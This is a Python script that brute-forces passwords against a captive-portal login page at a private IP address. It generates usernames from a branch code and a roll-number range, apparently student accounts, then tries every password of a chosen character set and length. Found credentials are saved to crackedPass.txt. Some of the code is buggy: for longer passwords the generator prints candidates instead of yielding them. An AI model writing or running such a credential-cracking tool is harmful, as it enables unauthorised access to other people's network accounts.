# constants
import requests
import sys
one,many = False,False
numeric = False
alpha = False
alphaNumeric = False
custom = False
branchCode = 'branch'
initialRoll = 'initial'
finalRoll = 'final'
url = 'http://172.16.1.3:8090/httpclient.html'
rollNumberList = []
length = 0
threads = 1



def enterDetails():
	global one,many,numeric,alpha,alphaNumeric,custom,branchCode,initialRoll,finalRoll,rollNumberList,length,threads

	choice = input('\nChoose your choice------\n1. Try for single username?\n2. Try for range of username?\n>>> ')
	choice = int(choice)

	# details
	if choice==1:
		roll = input('\n\nEnter username------\n>>> ')
		rollNumberList.append(roll)
	else:
		branchCode = input('\n\nEnter branch code------\n>>> ').lower()
		initialRoll = int(input('\n\nFirst roll number-----\n>>> '))
		finalRoll = int(input('\n\nLast roll number-----\n>>> '))
		rollNumberList = [branchCode+str(i) for i in range(initialRoll, finalRoll+1)]

	# password type
	print('\n\nChoose password type------')
	passType = input('1. Numeric\n2. Alphabet\n3. Special\n4. AlphaNumeric\n5. Custom\n>>> ')
	passType = int(passType)

	if passType == 1:
		numeric = True
	elif passType == 2:
		alpha = True
	elif passType == 3:
		special = True
	elif passType == 4:
		alphaNumeric = True
	elif passType == 5:
		custom = True

	length = int(input('\n\nEnter password length-----\n>>> '))
	#threads  = int(input('\n\nEnter number of threads\n>>> '))		




def sendRequest(roll, password):
	global url
	http = requests.post(url,
                             data={'mode': '191', 'username': roll, 'password': password, 'a': '1492117548250',
                                   'producttype': '0'})
	contents = str(http.content)
	if "logged in" in contents or "Login Limit" in contents or "exceeded" in contents:
		http = requests.post(url, data={'mode': '193', 'username': roll, 'a': '1492117548250',
                                        'producttype': '0'})
		return roll,password
	else:
		return False





def findPass():
	global one,many,numeric,alpha,alphaNumeric,custom,rollNumber,branchCode,initialRoll,finalRoll,url

	for roll in rollNumberList:
		sys.stdout.write("Trying for {}\n".format(roll))
		if numeric:
			a = passgen(low=48,high=58,n=length)
		if alpha:
			a = passgen(low=65,high=123,n=length)
		if alphaNumeric:
			a = passgen(low=48,high=123,n=length)
		if custom:
			a = passgen(low=32,high=123,n=length)

		while a:
			try:
				p = next(a)
				sys.stdout.write("trying>> % {}\r".format(p,'done'))
				res = sendRequest(roll, p)
				if res:
					with open("crackedPass.txt", mode="a") as file:
						file.write("{} -> {}\n".format(res[0],res[1]))
						sys.stdout.write('		Found for {}\n'.format(res[0]))
						break
			except StopIteration:
				break




def passgen(low=0, high=0, n=0):
	if n==1:
		for i in range(low,high):
			yield chr(i)

	if n==2:
		for i in range(low,high):
			for j in range(low,high):
				yield chr(i)+chr(j)

	if n==3:
		for i in range(low,high):
			for j in range(low,high):
				for k in range(low,high):
					yield chr(i)+chr(j)+chr(k)

	if n==4:
		for i in range(low,high):
			for j in range(low,high):
				for k in range(low,high):
					for l in range(low,high):
						print(chr(i)+chr(j)+chr(k)+chr(l))

	if n==5:
		for i in range(low,high):
			for j in range(low,high):
				for k in range(low,high):
					for l in range(low,high):
						for m in range(low,high):
							print(chr(i)+chr(j)+chr(k)+chr(l)+chr(m))

	if n==6:
		for i in range(low,high):
			for j in range(low,high):
				for k in range(low,high):
					for l in range(low,high):
						for m in range(low,high):
							for n in range(low,high):
								print(chr(i)+chr(j)+chr(k)+chr(l)+chr(m)+chr(n))





enterDetails()
#captivePortal()
findPass()